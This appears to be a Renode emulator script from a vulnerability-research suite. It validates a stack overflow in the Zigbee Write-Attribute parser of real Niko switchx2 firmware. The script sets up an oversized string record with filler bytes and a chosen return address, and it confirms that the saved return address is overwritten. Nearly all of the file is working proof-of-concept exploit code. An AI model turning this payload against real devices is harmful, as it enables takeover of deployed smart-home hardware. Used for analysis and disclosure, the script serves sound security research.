:name: ZB-05 Niko switchx2 sub_D290 0xFC00 Write-Attr overflow → saved-LR — validation
:description: Drives the 0xFC00 manufacturer-specific Write-Attribute record parser sub_D290 (case 0x107) of the real Niko switchx2 firmware on the emulated EFR32MG21 and demonstrates the attacker-length memmove overflowing a 4-byte local and overwriting the saved return address.
#
# Bug (sub_D290 @0xd290): declared string length = record[3]+1 stored unclamped
# at SP+0x1c (@0xd366); case 0x107 memmove(dst=SP+0x10, src=record+3, len) at
# 0xd540 (BL sub_696C) with NO bound. dst 4-byte local -> saved LR at SP+0x4c is
# 60 bytes away, so copied[60..63] overwrite the saved return address.
# Epilogue 0xd6d2 `pop {r4-r11,pc}` loads the corrupted LR into PC.
# Handler reached via 0xFC00 Write-Attribute frame (attr id 0x0107, type 0x42).

$bin=@scripts/silabs-vuln/zb05_niko.elf
include @scripts/silabs-vuln/boot_mg21.resc

emulation RunFor "0.3"
pause

# --- Parse-context struct @0x20001000 (r0 arg) ---
#  [0x00]=ptr to frame-header (0x20001100)  [0x06]!=0 guard-bypass
#  [0x08]=ptr to payload (0x20001200)  [0x0C]=len 0x50  [0x0F]!=0
#  [0x10]=profile 0x125F  [0x13]=frame type 0x02  [0x14]=record offset 0
sysbus WriteDoubleWord 0x20001000 0x20001100
sysbus WriteDoubleWord 0x20001004 0x00000100
sysbus WriteDoubleWord 0x20001008 0x20001200
sysbus WriteDoubleWord 0x2000100C 0x01000050
sysbus WriteDoubleWord 0x20001010 0x0000125F
sysbus WriteDoubleWord 0x20001014 0x00000002

# --- Frame-header struct @0x20001100: [0x02]=cluster 0xFC00, [0x05]=dir 0x01 ---
sysbus WriteDoubleWord 0x20001100 0xFC000000
sysbus WriteDoubleWord 0x20001104 0x00000100

# --- Oversized Write-Attribute record @0x20001200 ---
#  [0..1]=attr id 0x0107  [2]=type 0x42 (string)  [3]=declared len 0x3F (->copy 64)
#  [4..62]=0x41 filler  [63..66]=target 0x20005001 (LE 01 50 00 20) -> saved LR
sysbus WriteDoubleWord 0x20001200 0x413F4201
sysbus WriteDoubleWord 0x20001204 0x41414141
sysbus WriteDoubleWord 0x20001208 0x41414141
sysbus WriteDoubleWord 0x2000120C 0x41414141
sysbus WriteDoubleWord 0x20001210 0x41414141
sysbus WriteDoubleWord 0x20001214 0x41414141
sysbus WriteDoubleWord 0x20001218 0x41414141
sysbus WriteDoubleWord 0x2000121C 0x41414141
sysbus WriteDoubleWord 0x20001220 0x41414141
sysbus WriteDoubleWord 0x20001224 0x41414141
sysbus WriteDoubleWord 0x20001228 0x41414141
sysbus WriteDoubleWord 0x2000122C 0x41414141
sysbus WriteDoubleWord 0x20001230 0x41414141
sysbus WriteDoubleWord 0x20001234 0x41414141
sysbus WriteDoubleWord 0x20001238 0x41414141
sysbus WriteDoubleWord 0x2000123C 0x50014141
sysbus WriteDoubleWord 0x20001240 0x00002000

# --- Call frame: r0=context struct, SP=scratch, LR sentinel, PC=sub_D290 ---
sysbus.cpu SetRegister 13 0x20010000
sysbus.cpu SetRegister 14 0x20005001
sysbus.cpu SetRegister 0  0x20001000
sysbus.cpu PC 0xD290

echo ">>> BEFORE: saved-LR slot @0x2000FFFC ="
sysbus ReadDoubleWord 0x2000FFFC

sysbus AddWatchpointHook 0x2000FFFC DoubleWord Write "self.NoisyLog('>>> WATCHPOINT HIT: overflow overwrote saved-LR slot 0x2000FFFC = 0x{0:X}'.format(value))"

sysbus.cpu Step 3000

echo ">>> AFTER overflow: saved-LR slot @0x2000FFFC (expect 0x20005001) ="
sysbus ReadDoubleWord 0x2000FFFC
